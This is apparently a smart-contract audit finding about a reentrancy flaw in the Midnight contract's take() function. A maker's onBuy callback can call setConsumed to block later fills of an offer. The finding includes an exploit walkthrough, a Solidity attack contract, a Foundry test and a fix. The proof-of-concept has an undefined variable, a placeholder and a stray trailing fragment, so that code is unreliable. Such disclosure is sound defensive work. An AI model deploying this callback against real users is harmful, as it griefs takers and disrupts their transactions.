### Title
Maker's `onBuy` callback can call `setConsumed` to inflate `consumed` and block subsequent fills - (`src/Midnight.sol`)

### Summary
In `take()`, `consumed[maker][group]` is incremented and checked before the maker's `onBuy` callback is invoked. Because `setConsumed` only requires the caller to be authorized by `onBehalf`, a maker who pre-authorizes their callback contract can have that callback call `setConsumed(group, maxAssets, maker)` during `onBuy`, inflating `consumed` to the offer cap. Any subsequent fill of the same offer (or any offer sharing the same group) in the same transaction will then revert with `ConsumedAssets`/`ConsumedUnits`, violating the invariant that `consumed` after a `take` equals `consumed_before + delta`.

**Attacker inputs and exploit flow:**

1. Maker deploys `MaliciousCallback` implementing `IBuyCallback`.
2. Maker calls `setIsAuthorized(MaliciousCallback, true, maker)` — authorizes the callback to act on their behalf.
3. Maker creates a buy offer with `offer.callback = MaliciousCallback`, `offer.maxAssets = M`, `offer.group = G`.
4. Taker calls `take(offer, ..., units1)` (partial fill, `units1 < M`):
   - `consumed[maker][G] += buyerAssets1` → e.g., 50. Check passes (50 ≤ M=100).
   - `onBuy` is called on `MaliciousCallback`.
   - Inside `onBuy`, callback calls `setConsumed(G, M, maker)` (e.g., 100).
   - `setConsumed` checks: `isAuthorized[maker][MaliciousCallback]` = true ✓; `100 >= 50` ✓. Sets `consumed[maker][G] = 100`.
   - `take()` completes successfully.
5. Taker (or bundler) calls `take(offer, ..., units2)` in the same transaction (via multicall):
   - `consumed[maker][G] += buyerAssets2` → 100 + delta > 100. Reverts with `ConsumedAssets`.

**Why existing checks fail:**

- `AlreadyConsumed` in `setConsumed` only prevents *decreasing* consumed, not inflating it.
- There is no reentrancy guard preventing `setConsumed` from being called during `take`.
- The Certora `Consume.spec` rules (`takeConsumedDelta`, `takeConsumedBoundedByMax`) explicitly exclude reentrancy from their model: [5](#0-4) 

### Impact Explanation
A maker can use their `onBuy` callback to inflate `consumed[maker][group]` to `maxAssets` after a partial fill. Any subsequent `take` on the same offer or any offer sharing the same group within the same transaction reverts with `ConsumedAssets`. In a multicall context this reverts the entire bundle; in a try/catch context the taker silently receives fewer units than intended. The maker can selectively allow partial fills while atomically blocking further fills, griefing takers who rely on filling the full offer in one transaction.

### Likelihood Explanation
Preconditions are fully attacker-controlled: the maker chooses `offer.callback`, `offer.group`, `offer.maxAssets`, and pre-authorizes the callback via `setIsAuthorized`. No special privileges, oracle manipulation, or external conditions are required. The attack is repeatable on every `take` that triggers the callback.

### Recommendation
Prevent `setConsumed` from being called re-entrantly during `take`. The simplest fix mirrors the existing liquidation lock pattern: set a transient-storage flag at the start of `take` and check it in `setConsumed`, reverting if the flag is set. Alternatively, snapshot `consumed[maker][group]` before the callback and assert it is unchanged after the callback returns, reverting if it was externally modified.

contract MaliciousCallback is IBuyCallback {
    IMidnight midnight;
    bytes32 group;
    uint256 maxAssets;
    address maker;

    constructor(IMidnight _midnight, bytes32 _group, uint256 _maxAssets, address _maker) {
        midnight = _midnight; group = _group; maxAssets = _maxAssets; maker = _maker;
    }

    function onBuy(bytes32, Market memory, uint256, uint256, uint256, address, bytes memory)
        external returns (bytes32)
    {
        // Inflate consumed to maxAssets, blocking all subsequent fills
        midnight.setConsumed(group, maxAssets, maker);
        ERC20(market.loanToken).approve(address(midnight), type(uint256).max);
        return CALLBACK_SUCCESS;
    }
}

function testCallbackInflatesConsumedBlocksSubsequentFill() public {
    uint256 maxAssets = 100e18;
    MaliciousCallback cb = new MaliciousCallback(midnight, group, maxAssets, maker);

    vm.prank(maker);
    midnight.setIsAuthorized(address(cb), true, maker);

    Offer memory offer = /* buy offer, maker=maker, maxAssets=maxAssets, callback=cb */;
    deal(loanToken, address(cb), maxAssets);

    // First fill: 50 units — succeeds, but callback inflates consumed to maxAssets
    vm.prank(taker);
    midnight.take(offer, hex"", 50, taker, taker, address(0), hex"");

    assertEq(midnight.consumed(maker, group), maxAssets); // inflated

    // Second fill: any units — must revert with ConsumedAssets
    vm.expectRevert(IMidnight.ConsumedAssets.selector);
    vm.prank(taker);
    midnight.take(offer, hex"", 1, taker, taker, address(0), hex"");
}

    uint256 consumedAfter = consumed(user, group);
